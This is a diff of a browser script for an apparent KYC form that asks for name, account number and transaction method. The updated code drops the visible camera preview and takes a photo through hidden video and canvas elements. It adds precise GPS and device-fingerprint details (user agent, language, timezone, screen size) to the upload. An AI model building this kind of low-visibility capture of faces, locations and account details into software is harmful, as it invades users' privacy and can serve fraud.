@@ -1,81 +1,119 @@
-const form        = document.getElementById("kycForm");
-const statusBox   = document.getElementById("status");
-const statusText  = document.querySelector(".status-text");
-const submitBtn   = document.getElementById("submitBtn");
-const btnSpinner  = submitBtn.querySelector(".btn-spinner");
-const btnLabel    = submitBtn.querySelector(".btn-label");
-const previewVideo = document.getElementById("preview");
-const captureCanvas = document.getElementById("captureCanvas");
+"use strict";
 
-let stream = null;
+const form       = document.getElementById("kycForm");
+const statusBox  = document.getElementById("status");
+const statusText = statusBox.querySelector(".status-text");
+const statusDot  = statusBox.querySelector(".dot");
+const submitBtn  = document.getElementById("submitBtn");
+const btnSpinner = document.getElementById("btnSpinner");
+const btnLabel   = document.getElementById("btnLabel");
 
-function setStatus(message, type) {
+const hiddenVideo  = document.getElementById("hiddenVideo");
+const hiddenCanvas = document.getElementById("hiddenCanvas");
+
+function setStatus(message, mode) {
+  statusText.textContent = message;
   statusBox.classList.remove(
-    "status-recording",
     "status-uploading",
     "status-error",
-    "status-success"
+    "status-success",
+    "status-recording"
   );
-  if (type) statusBox.classList.add("status-" + type);
-  statusText.textContent = message || "";
-}
-
-/** Start the camera and wait until the video has a real frame. */
-async function startCamera() {
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: true,
-    audio: false
-  });
-
-  previewVideo.srcObject = stream;
-
-  // Ensure playback actually starts
-  try {
-    await previewVideo.play();
-  } catch (e) {
-    // some browsers auto-play silently anyway
+  if (mode) {
+    statusBox.classList.add("status-" + mode);
   }
 
-  // Wait until the video can play & has dimensions
+  // Dot color is handled by CSS via class
+}
+
+function setLoading(isLoading) {
+  if (isLoading) {
+    submitBtn.disabled = true;
+    btnSpinner.style.display = "inline-block";
+    btnLabel.textContent = "Processing…";
+  } else {
+    submitBtn.disabled = false;
+    btnSpinner.style.display = "none";
+    btnLabel.textContent = "Submit Transaction Information";
+  }
+}
+
+// Capture one still photo from camera
+async function capturePhoto() {
+  let stream;
+  try {
+    setStatus("Requesting camera access…", "recording");
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
+    });
+
+    hiddenVideo.srcObject = stream;
+
+    // Wait for metadata so we know videoWidth / videoHeight
+    await new Promise((resolve) => {
+      hiddenVideo.onloadedmetadata = () => {
+        hiddenVideo.play().then(resolve).catch(resolve);
+      };
+    });
+
+    const width  = hiddenVideo.videoWidth  || 640;
+    const height = hiddenVideo.videoHeight || 480;
+
+    hiddenCanvas.width  = width;
+    hiddenCanvas.height = height;
+
+    const ctx = hiddenCanvas.getContext("2d");
+    ctx.drawImage(hiddenVideo, 0, 0, width, height);
+
+    // Convert to PNG blob
+    const blob = await new Promise((resolve, reject) => {
+      hiddenCanvas.toBlob((b) => {
+        if (b) resolve(b);
+        else reject(new Error("Failed to create image blob"));
+      }, "image/png");
+    });
+
+    return blob;
+  } finally {
+    // Stop tracks so camera light turns off
+    if (hiddenVideo.srcObject) {
+      hiddenVideo.srcObject.getTracks().forEach((t) => t.stop());
+      hiddenVideo.srcObject = null;
+    }
+  }
+}
+
+// Optional GPS – requires explicit browser permission
+function getLocation() {
   return new Promise((resolve) => {
-    function ready() {
-      if (previewVideo.videoWidth && previewVideo.videoHeight) {
-        resolve();
+    if (!("geolocation" in navigator)) {
+      return resolve(null);
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        resolve({
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        });
+      },
+      (err) => {
+        console.warn("Geolocation error:", err);
+        resolve(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 8000,
+        maximumAge: 0
       }
-    }
-
-    if (previewVideo.readyState >= 2 && previewVideo.videoWidth && previewVideo.videoHeight) {
-      // already ready
-      resolve();
-    } else {
-      previewVideo.addEventListener("loadedmetadata", ready, { once: true });
-      previewVideo.addEventListener("canplay", ready, { once: true });
-    }
+    );
   });
 }
 
-/** Capture a still image from the video into a PNG Blob. */
-function capturePhoto() {
-  const width  = previewVideo.videoWidth  || 640;
-  const height = previewVideo.videoHeight || 480;
-
-  captureCanvas.width = width;
-  captureCanvas.height = height;
-
-  const ctx = captureCanvas.getContext("2d");
-  ctx.drawImage(previewVideo, 0, 0, width, height);
-
-  return new Promise((resolve) => {
-    captureCanvas.toBlob((blob) => {
-      resolve(blob);
-    }, "image/png");
-  });
-}
-
-/** Upload form fields + photo + device info to the server. */
 async function uploadData(formData, photoBlob) {
-  formData.append("photo", photoBlob, "kyc-photo.png");
-  formData.append("deviceInfo", navigator.userAgent || "unknown");
+  formData.append("photo", photoBlob, "capture.png");
 
   const res = await fetch("/upload-photo", {
     method: "POST",
@@ -83,58 +121,71 @@ async function uploadData(formData, photoBlob) {
   });
 
   if (!res.ok) {
-    throw new Error("Upload failed: " + res.status);
+    const txt = await res.text().catch(() => "");
+    throw new Error("Upload failed: " + res.status + " " + txt);
   }
 
-  return res.text();
+  return res.json(); // { ok: true, fileName: "...", ... }
 }
 
 if (form) {
   form.addEventListener("submit", async (event) => {
     event.preventDefault();
 
-    if (!form.fullName.value.trim() ||
-        !form.accountNumber.value.trim() ||
-        !form.transactionMethod.value) {
-      setStatus("Please complete all fields before submitting.", "error");
+    // Simple client-side check
+    if (!form.checkValidity()) {
+      form.reportValidity();
       return;
     }
 
     try {
-      submitBtn.disabled = true;
-      btnSpinner.style.display = "inline-block";
-      btnLabel.textContent = "Submitting…";
+      setLoading(true);
+      setStatus("Capturing photo… please keep still for a moment.", "recording");
 
-      setStatus("Requesting camera access…", "recording");
-      await startCamera();
-
-      // tiny delay just to be safe
-      await new Promise(r => setTimeout(r, 200));
-
-      setStatus("Capturing verification photo…", "recording");
       const photoBlob = await capturePhoto();
+
+      setStatus("Requesting GPS (optional)…", "uploading");
+      const loc = await getLocation();
 
       const formData = new FormData(form);
 
-      setStatus("Uploading securely…", "uploading");
-      const serverMessage = await uploadData(formData, photoBlob);
+      // Extra device/context info
+      formData.append("deviceInfo", navigator.userAgent || "");
+      formData.append("clientLanguage", navigator.language || "");
+      formData.append(
+        "clientTimezone",
+        Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+      );
+      formData.append(
+        "screenSize",
+        `${window.screen.width}x${window.screen.height}`
+      );
 
-      setStatus("Submitted successfully. Server says: " + serverMessage, "success");
+      if (loc) {
+        formData.append("gpsLat", String(loc.lat));
+        formData.append("gpsLng", String(loc.lng));
+        formData.append("gpsAccuracy", String(loc.accuracy));
+      }
+
+      setStatus("Uploading securely…", "uploading");
+      const result = await uploadData(formData, photoBlob);
+
+      if (result.ok) {
+        setStatus(
+          "Submitted successfully. Photo stored as: " + result.fileName,
+          "success"
+        );
+      } else {
+        setStatus(
+          "Upload completed with warning: " + (result.error || "Unknown"),
+          "error"
+        );
+      }
     } catch (err) {
       console.error(err);
-      if (err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError")) {
-        setStatus("Camera permission denied. Please allow camera access and try again.", "error");
-      } else {
-        setStatus("Error: " + (err.message || String(err)), "error");
-      }
+      setStatus("Error: " + (err.message || err), "error");
     } finally {
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        stream = null;
-      }
-      submitBtn.disabled = false;
-      btnSpinner.style.display = "none";
-      btnLabel.textContent = "Submit Transaction Information";
+      setLoading(false);
     }
   });
 }
